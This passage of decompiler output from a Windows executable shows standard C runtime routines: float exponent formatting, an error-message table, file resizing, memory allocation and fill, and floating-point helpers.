      if (((int)param_6 < *(int *)(param_3 + 0x2c)) && ((*(ushort *)(param_3 + 0x38) & 8) == 0)) {
        *(int *)(param_3 + 0x2c) = (int)param_6;
      }
      iVar2 = *(int *)(param_3 + 0x2c) + -1;
      *(int *)(param_3 + 0x2c) = iVar2;
      if (iVar2 < 0) {
        *(undefined4 *)(param_3 + 0x2c) = 0;
      }
      param_4 = ((param_4 != 'g') - 1U & 0x20) + 0x45;
    }
    else if (param_4 == 'a') {
      param_4 = 'p';
    }
    else if (param_4 == 'A') {
      param_4 = 'P';
    }
    iVar2 = *(int *)(param_3 + 0x1c);
    *(int *)(param_3 + 0x1c) = iVar2 + 1;
    iVar3 = *(int *)(param_3 + 0x10);
    *(undefined *)(iVar3 + iVar2) = *(undefined *)param_5;
    if ((0 < *(int *)(param_3 + 0x2c)) || ((*(ushort *)(param_3 + 0x38) & 8) != 0)) {
      iVar2 = *(int *)(param_3 + 0x1c);
      *(int *)(param_3 + 0x1c) = iVar2 + 1;
      iVar3 = *(int *)(param_3 + 0x10);
      *(undefined *)(iVar3 + iVar2) = uVar1;
    }
    if (0 < *(int *)(param_3 + 0x2c)) {
      param_6 = param_6 + -1;
      if (*(int *)(param_3 + 0x2c) < (int)param_6) {
        param_6 = *(short *)(param_3 + 0x2c);
      }
      FUN_00404a40(iVar3,iVar2,(undefined8 *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10)),
                   (undefined8 *)((int)param_5 + 1),(int)param_6);
      *(int *)(param_3 + 0x1c) = *(int *)(param_3 + 0x1c) + (int)param_6;
      *(int *)(param_3 + 0x20) = *(int *)(param_3 + 0x2c) - (int)param_6;
    }
    pcVar4 = (char *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10));
    *pcVar4 = param_4;
    if (param_7 < 0) {
      pcVar4[1] = '-';
      local_18 = -param_7;
    }
    else {
      pcVar4[1] = '+';
      local_18 = param_7;
    }
    pcVar5 = pcVar4 + 2;
    local_20 = 0;
    while (0 < local_18) {
      uVar7 = FUN_00409dd0((int)local_18,10);
      acStack_f[local_20 + 1] = (char)((ulonglong)uVar7 >> 0x20);
      local_20 = local_20 + 1;
      local_18 = (short)uVar7;
    }
    if ((local_20 < 2) && ((param_4 == 'e' || (param_4 == 'E')))) {
      *pcVar5 = '0';
      pcVar5 = pcVar4 + 3;
    }
    if (local_20 == 0) {
      *pcVar5 = '0';
      pcVar5 = pcVar5 + 1;
    }
    for (; 0 < local_20; local_20 = local_20 + -1) {
      *pcVar5 = acStack_f[local_20] + '0';
      pcVar5 = pcVar5 + 1;
    }
    *(int *)(param_3 + 0x24) = (int)pcVar5 - (*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10));
  }
  if (((*(ushort *)(param_3 + 0x38) & 0x14) == 0x10) &&
     (iVar2 = *(int *)(param_3 + 0x14) + *(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x20) +
              *(int *)(param_3 + 0x24) + *(int *)(param_3 + 0x28), iVar2 < *(int *)(param_3 + 0x34))
     ) {
    *(int *)(param_3 + 0x18) = *(int *)(param_3 + 0x34) - iVar2;
  }
  return;
}



char * __cdecl FUN_00409600(int param_1)

{
  char cVar1;
  char *pcVar2;
  
  switch(param_1) {
  case 0:
    pcVar2 = "No error";
    break;
  case 1:
    pcVar2 = "Operation not permitted";
    break;
  case 2:
    pcVar2 = "No such file or directory";
    break;
  case 3:
    pcVar2 = "No such process";
    break;
  case 4:
    pcVar2 = "Interrupted function";
    break;
  case 5:
    pcVar2 = "I/O error";
    break;
  case 6:
    pcVar2 = "No such device or address";
    break;
  case 7:
    pcVar2 = "Argument list too long";
    break;
  case 8:
    pcVar2 = "Executable file format error";
    break;
  case 9:
    pcVar2 = "Bad file descriptor";
    break;
  case 10:
    pcVar2 = "No child processes";
    break;
  case 0xb:
    pcVar2 = "Resource temporarily unavailable";
    break;
  case 0xc:
    pcVar2 = "Not enough space";
    break;
  case 0xd:
    pcVar2 = "Permission denied";
    break;
  case 0xe:
    pcVar2 = "Bad address";
    break;
  default:
    if ((param_1 < 0) || (0xff < param_1)) {
      pcVar2 = "Unknown error";
    }
    else {
      pcVar2 = "Error #xxx";
      do {
        cVar1 = *pcVar2;
        pcVar2[0x207c] = cVar1;
        pcVar2 = pcVar2 + 1;
      } while (cVar1 != '\0');
      DAT_0040e221 = (char)(param_1 % 10) + '0';
      DAT_0040e220 = (char)((param_1 / 10) % 10) + '0';
      DAT_0040e21f = (char)(((param_1 / 10) / 10) % 10) + '0';
      pcVar2 = &DAT_0040e218;
    }
    break;
  case 0x10:
    pcVar2 = "Device or resource busy";
    break;
  case 0x11:
    pcVar2 = "File exists";
    break;
  case 0x12:
    pcVar2 = "Cross-device link";
    break;
  case 0x13:
    pcVar2 = "No such device";
    break;
  case 0x14:
    pcVar2 = "Not a directory";
    break;
  case 0x15:
    pcVar2 = "Is a directory";
    break;
  case 0x16:
    pcVar2 = "Invalid argument";
    break;
  case 0x17:
    pcVar2 = "Too many files open in system";
    break;
  case 0x18:
    pcVar2 = "Too many open files";
    break;
  case 0x19:
    pcVar2 = "Inappropriate I/O control operation";
    break;
  case 0x1b:
    pcVar2 = "File too large";
    break;
  case 0x1c:
    pcVar2 = "No space left on device";
    break;
  case 0x1d:
    pcVar2 = "Invalid seek";
    break;
  case 0x1e:
    pcVar2 = "Read-only file system";
    break;
  case 0x1f:
    pcVar2 = "Too many links";
    break;
  case 0x20:
    pcVar2 = "Broken pipe";
    break;
  case 0x21:
    pcVar2 = "Mathematics argument out of domain of function";
    break;
  case 0x22:
    pcVar2 = "Range error";
    break;
  case 0x23:
    pcVar2 = "File positioning error";
    break;
  case 0x24:
    pcVar2 = "Resource deadlock would occur";
    break;
  case 0x26:
    pcVar2 = "Filename too long";
    break;
  case 0x27:
    pcVar2 = "No locks available";
    break;
  case 0x28:
    pcVar2 = "Function not supported";
    break;
  case 0x29:
    pcVar2 = "Directory not empty";
    break;
  case 0x2a:
    pcVar2 = "Multibyte encoding error";
  }
  return pcVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00409840(uint param_1,int param_2)

{
  DWORD DVar1;
  DWORD DVar2;
  undefined8 *puVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  HANDLE hFile;
  BOOL BVar7;
  uint uVar8;
  undefined4 local_10;
  
  if ((param_1 < DAT_0040e300) &&
     ((*(byte *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    DVar1 = FUN_00408af0(param_1,0,1);
    if ((DVar1 != 0xffffffff) && (DVar2 = FUN_00408af0(param_1,0,2), DVar2 != 0xffffffff)) {
      uVar8 = -DVar2 + param_2;
      if (uVar8 == 0 || SCARRY4(-DVar2,param_2) != (int)uVar8 < 0) {
        local_10 = 0;
        if ((int)uVar8 < 0) {
          DVar2 = FUN_00408af0(param_1,param_2,0);
          if (DVar2 == 0xffffffff) {
            local_10 = 0xffffffff;
          }
          else {
            hFile = (HANDLE)FUN_00407980(param_1);
            BVar7 = SetEndOfFile(hFile);
            local_10 = 0;
            if (BVar7 == 0) {
              _DAT_0040d334 = 0xd;
              local_10 = 0xffffffff;
            }
          }
        }
      }
      else {
        puVar3 = FUN_00409e10(1,0x1000);
        if (puVar3 == (undefined8 *)0x0) {
          local_10 = 0xffffffff;
        }
        else {
          iVar4 = FUN_00409e70(param_1,0x8000);
          do {
            uVar5 = 0x1000;
            if ((int)uVar8 < 0x1000) {
              uVar5 = uVar8;
            }
            iVar6 = FUN_004074e0(param_1,(char *)puVar3,uVar5);
            if (iVar6 == -1) {
              local_10 = 0xffffffff;
              break;
            }
            uVar8 = uVar8 - iVar6;
            local_10 = 0;
          } while (0 < (int)uVar8);
          FUN_00409e70(param_1,iVar4);
          FUN_004040b0(puVar3);
        }
      }
      FUN_00408af0(param_1,DVar1,0);
      return local_10;
    }
  }
  else {
    _DAT_0040d334 = 9;
  }
  return 0xffffffff;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_004099b0(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



undefined4 __cdecl FUN_00409a00(undefined8 *param_1,uint *param_2)

{
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  char *pcVar4;
  char *local_8;
  
  while( true ) {
    if (*(char *)param_1 == '\0') {
      if (((*(ushort *)param_2 & 0x800) != 0) && (iVar3 = FUN_004055c0(param_2), iVar3 != 0)) {
        return 0xffffffff;
      }
      if ((*(ushort *)param_2 & 0xc00) != 0) {
        param_2[6] = param_2[4];
      }
      return 0;
    }
    if ((param_2[6] <= param_2[4]) && (iVar3 = FUN_00405760(param_2), iVar3 < 0)) break;
    if ((*(ushort *)param_2 & 0x400) == 0) {
      local_8 = (char *)0x0;
    }
    else {
      local_8 = FUN_00409f40((char *)param_1,'\n');
    }
    if (local_8 == (char *)0x0) {
      pcVar1 = (char *)0xffffffff;
      do {
        pcVar1 = pcVar1 + 1;
      } while (*(char *)((int)param_1 + (int)pcVar1) != '\0');
    }
    else {
      pcVar1 = local_8 + (1 - (int)param_1);
    }
    pcVar2 = (char *)(param_2[6] - param_2[4]);
    pcVar4 = pcVar1;
    if (pcVar2 < pcVar1) {
      local_8 = (char *)0x0;
      pcVar4 = pcVar2;
    }
    FUN_00404a40(pcVar1,param_2[4],(undefined8 *)param_2[4],param_1,(uint)pcVar4);
    param_1 = (undefined8 *)((int)param_1 + (int)pcVar4);
    param_2[4] = (uint)(pcVar4 + (int)param_2[4]);
    if ((local_8 != (char *)0x0) && (iVar3 = FUN_004055c0(param_2), iVar3 != 0)) {
      return 0xffffffff;
    }
  }
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_00409af0(LPSTR param_1)

{
  int iVar1;
  int local_8;
  
  local_8 = 0;
  iVar1 = WideCharToMultiByte(DAT_0040d9a0,0,(LPCWSTR)&stack0x00000008,1,param_1,(uint)DAT_0040d89c,
                              (LPCSTR)0x0,&local_8);
  if ((iVar1 == 0) || (local_8 != 0)) {
    _DAT_0040d334 = 0x2a;
    iVar1 = -1;
  }
  return iVar1;
}



undefined4 __cdecl FUN_00409b50(short *param_1,ushort *param_2)

{
  undefined4 uVar1;
  int iVar2;
  ushort uVar3;
  
  uVar3 = (param_2[3] & 0x7ff0) >> 4;
  if (uVar3 == 0x7ff) {
    *param_1 = 0;
    if (((((param_2[3] & 0xf) == 0) && (param_2[2] == 0)) && (param_2[1] == 0)) && (*param_2 == 0))
    {
      uVar1 = 1;
    }
    else {
      uVar1 = 2;
    }
  }
  else {
    if ((param_2[3] & 0x7ff0) == 0) {
      iVar2 = FUN_00409f60(param_2);
      uVar3 = (ushort)iVar2;
      if (0 < (short)uVar3) {
        *param_1 = 0;
        return 0;
      }
    }
    param_2[3] = param_2[3] & 0x800f | 0x3fe0;
    *param_1 = uVar3 - 0x3fe;
    uVar1 = 0xffffffff;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00409bf0(double *param_1,int param_2)

{
  byte bVar1;
  short sVar2;
  undefined4 uVar3;
  int iVar4;
  uint uVar5;
  ushort uVar6;
  ushort uVar7;
  double local_c;
  
  uVar6 = *(ushort *)((int)param_1 + 6) & 0x7ff0;
  uVar7 = uVar6 >> 4;
  if (uVar7 == 0x7ff) {
    if (((((*(ushort *)((int)param_1 + 6) & 0xf) == 0) && (*(short *)((int)param_1 + 4) == 0)) &&
        (*(short *)((int)param_1 + 2) == 0)) && (*(short *)param_1 == 0)) {
      uVar3 = 1;
    }
    else {
      uVar3 = 2;
    }
  }
  else {
    if (uVar6 == 0) {
      iVar4 = FUN_00409f60((ushort *)param_1);
      uVar7 = (ushort)iVar4;
      if (0 < (short)uVar7) {
        return 0;
      }
    }
    iVar4 = param_2 + (short)uVar7;
    if (iVar4 < 0x7ff) {
      if (iVar4 < 1) {
        uVar7 = *(ushort *)((int)param_1 + 6) & 0x8000;
        *(ushort *)((int)param_1 + 6) = *(ushort *)((int)param_1 + 6) & 0xf | 0x10;
        uVar5 = iVar4 - 1;
        if ((int)uVar5 < -0x34) {
          *(ushort *)((int)param_1 + 6) = uVar7;
          *(undefined2 *)((int)param_1 + 4) = 0;
          *(undefined2 *)((int)param_1 + 2) = 0;
          *(undefined2 *)param_1 = 0;
          uVar3 = 0;
        }
        else {
          while (sVar2 = (short)uVar5, sVar2 < -0xf) {
            *(undefined2 *)param_1 = *(undefined2 *)((int)param_1 + 2);
            *(undefined2 *)((int)param_1 + 2) = *(undefined2 *)((int)param_1 + 4);
            *(undefined2 *)((int)param_1 + 4) = *(undefined2 *)((int)param_1 + 6);
            *(undefined2 *)((int)param_1 + 6) = 0;
            uVar5 = (uint)(ushort)(sVar2 + 0x10);
          }
          if (-sVar2 != 0) {
            bVar1 = (byte)-sVar2;
            *(ushort *)param_1 =
                 *(short *)((int)param_1 + 2) << (0x10 - bVar1 & 0x1f) |
                 (ushort)((int)(uint)*(ushort *)param_1 >> (bVar1 & 0x1f));
            *(ushort *)((int)param_1 + 2) =
                 *(short *)((int)param_1 + 4) << (0x10 - bVar1 & 0x1f) |
                 (ushort)((int)(uint)*(ushort *)((int)param_1 + 2) >> (bVar1 & 0x1f));
            *(ushort *)((int)param_1 + 4) =
                 *(short *)((int)param_1 + 6) << (0x10 - bVar1 & 0x1f) |
                 (ushort)((int)(uint)*(ushort *)((int)param_1 + 4) >> (bVar1 & 0x1f));
            *(short *)((int)param_1 + 6) =
                 (short)((int)(uint)*(ushort *)((int)param_1 + 6) >> (bVar1 & 0x1f));
          }
          *(ushort *)((int)param_1 + 6) = *(ushort *)((int)param_1 + 6) | uVar7;
          uVar3 = 0xffffffff;
        }
      }
      else {
        *(ushort *)((int)param_1 + 6) =
             *(ushort *)((int)param_1 + 6) & 0x800f | (ushort)((int)(short)iVar4 << 4);
        uVar3 = 0xffffffff;
      }
    }
    else {
      if ((*(ushort *)((int)param_1 + 6) & 0x8000) == 0) {
        local_c = _DAT_0040d9e8;
      }
      else {
        local_c = -_DAT_0040d9e8;
      }
      *param_1 = local_c;
      uVar3 = 1;
    }
  }
  return uVar3;
}



undefined8 __cdecl FUN_00409dd0(int param_1,int param_2)

{
  return CONCAT44(param_1 - param_2 * (param_1 / param_2),param_1 / param_2);
}



undefined8 * __cdecl FUN_00409e10(uint param_1,uint param_2)

{
  uint uVar1;
  undefined8 *local_8;
  
  uVar1 = param_2 * param_1;
  if ((param_2 == 0) || (local_8 = (undefined8 *)0x0, uVar1 / param_2 == param_1)) {
    local_8 = (undefined8 *)FUN_00403d00(uVar1);
    if (local_8 != (undefined8 *)0x0) {
      FUN_0040a070(local_8,0,uVar1);
    }
  }
  return local_8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_00409e70(uint param_1,int param_2)

{
  byte *pbVar1;
  int iVar2;
  int iVar3;
  
  if ((param_1 < DAT_0040e300) &&
     (iVar3 = (int)param_1 >> 5,
     (*(byte *)((&DAT_0040e304)[iVar3] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    iVar2 = (((*(byte *)((&DAT_0040e304)[iVar3] + 4 + (param_1 & 0x1f) * 8) & 0x80) != 0) - 1 &
            0x4000) + 0x4000;
    if (param_2 == 0x8000) {
      pbVar1 = (byte *)((&DAT_0040e304)[iVar3] + 4 + (param_1 & 0x1f) * 8);
      *pbVar1 = *pbVar1 & 0x7f;
    }
    else if (param_2 == 0x4000) {
      pbVar1 = (byte *)((&DAT_0040e304)[iVar3] + 4 + (param_1 & 0x1f) * 8);
      *pbVar1 = *pbVar1 | 0x80;
    }
    else {
      _DAT_0040d334 = 0x16;
      iVar2 = -1;
    }
  }
  else {
    _DAT_0040d334 = 9;
    iVar2 = -1;
  }
  return iVar2;
}



char * __cdecl FUN_00409f40(char *param_1,char param_2)

{
  char *pcVar1;
  
  pcVar1 = (char *)0x0;
  while( true ) {
    if (*param_1 == param_2) {
      pcVar1 = param_1;
    }
    if (*param_1 == '\0') break;
    param_1 = param_1 + 1;
  }
  return pcVar1;
}



int __cdecl FUN_00409f60(ushort *param_1)

{
  ushort uVar1;
  ushort uVar2;
  short sVar3;
  
  uVar1 = param_1[3];
  uVar2 = param_1[3];
  param_1[3] = uVar2 & 0xf;
  sVar3 = 1;
  if (((((uVar2 & 0xf) != 0) || (sVar3 = 1, param_1[2] != 0)) || (sVar3 = 1, param_1[1] != 0)) ||
     (sVar3 = 1, *param_1 != 0)) {
    while (param_1[3] == 0) {
      param_1[3] = param_1[2];
      param_1[2] = param_1[1];
      param_1[1] = *param_1;
      *param_1 = 0;
      sVar3 = sVar3 + -0x10;
    }
    while (param_1[3] < 0x10) {
      param_1[3] = param_1[3] * 2 | (ushort)((int)(uint)param_1[2] >> 0xf);
      param_1[2] = param_1[2] * 2 | (ushort)((int)(uint)param_1[1] >> 0xf);
      param_1[1] = param_1[1] * 2 | (ushort)((int)(uint)*param_1 >> 0xf);
      *param_1 = *param_1 << 1;
      sVar3 = sVar3 + -1;
    }
    while (0x1f < param_1[3]) {
      *param_1 = (ushort)((int)(uint)*param_1 >> 1) | param_1[1] << 0xf;
      param_1[1] = (ushort)((int)(uint)param_1[1] >> 1) | param_1[2] << 0xf;
      param_1[2] = (ushort)((int)(uint)param_1[2] >> 1) | param_1[3] << 0xf;
      param_1[3] = param_1[3] >> 1;
      sVar3 = sVar3 + 1;
    }
    param_1[3] = param_1[3] & 0xf;
  }
  param_1[3] = param_1[3] | uVar1 & 0x8000;
  return (int)sVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 * __cdecl FUN_0040a070(undefined8 *param_1,int param_2,uint param_3)

{
  undefined uVar1;
  uint uVar2;
  uint uVar3;
  undefined8 *puVar4;
  undefined8 *puVar5;
  undefined8 *puVar6;
  undefined8 uVar7;
  
  puVar6 = param_1;
  if ((_DAT_0040d88c & 2) == 0) {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(char *)puVar6 = (char)param_2;
      puVar6 = (undefined8 *)((int)puVar6 + 1);
    }
    return param_1;
  }
  uVar3 = param_2 * 0x1010101;
  uVar1 = (undefined)uVar3;
  if (0x3f < param_3) {
    if ((param_3 < 0x8001) || (0x10000 < param_3)) {
      uVar2 = 8U - (int)param_1 & 7;
      param_3 = param_3 - uVar2;
      puVar4 = param_1;
      switch(uVar2) {
      case 7:
        puVar6 = (undefined8 *)((int)param_1 + 1);
        *(undefined *)param_1 = uVar1;
      case 6:
        puVar4 = (undefined8 *)((int)puVar6 + 1);
        *(undefined *)puVar6 = uVar1;
      case 5:
        puVar6 = (undefined8 *)((int)puVar4 + 1);
        *(undefined *)puVar4 = uVar1;
      case 4:
        puVar4 = (undefined8 *)((int)puVar6 + 1);
        *(undefined *)puVar6 = uVar1;
      case 3:
        puVar6 = (undefined8 *)((int)puVar4 + 1);
        *(undefined *)puVar4 = uVar1;
      case 2:
        puVar4 = (undefined8 *)((int)puVar6 + 1);
        *(undefined *)puVar6 = uVar1;
      case 1:
        puVar6 = (undefined8 *)((int)puVar4 + 1);
        *(undefined *)puVar4 = uVar1;
      }
    }
    uVar2 = param_3 >> 6;
    if (uVar2 != 0) {
      uVar7 = pshufw((ulonglong)uVar3,(ulonglong)uVar3,0);
      do {
        *puVar6 = uVar7;
        puVar6[1] = uVar7;
        puVar6[2] = uVar7;
        puVar6[3] = uVar7;
        puVar6[4] = uVar7;
        puVar6[5] = uVar7;
        puVar6[6] = uVar7;
        puVar6[7] = uVar7;
        puVar6 = puVar6 + 8;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
  }
  puVar4 = puVar6;
  puVar5 = puVar6;
  switch(param_3 >> 2 & 0xf) {
  case 0xf:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 0xe:
    puVar5 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 0xd:
    puVar6 = (undefined8 *)((int)puVar5 + 4);
    *(uint *)puVar5 = uVar3;
  case 0xc:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 0xb:
    puVar6 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 10:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 9:
    puVar6 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 8:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 7:
    puVar6 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 6:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 5:
    puVar6 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 4:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 3:
    puVar6 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 2:
    puVar4 = (undefined8 *)((int)puVar6 + 4);
    *(uint *)puVar6 = uVar3;
  case 1:
    puVar6 = (undefined8 *)((int)puVar4 + 4);
    *(uint *)puVar4 = uVar3;
  case 0:
    uVar3 = param_3 & 3;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *(undefined *)puVar6 = uVar1;
        puVar6 = (undefined8 *)((int)puVar6 + 1);
      }
    }
    return param_1;
  }
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0040a180. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}


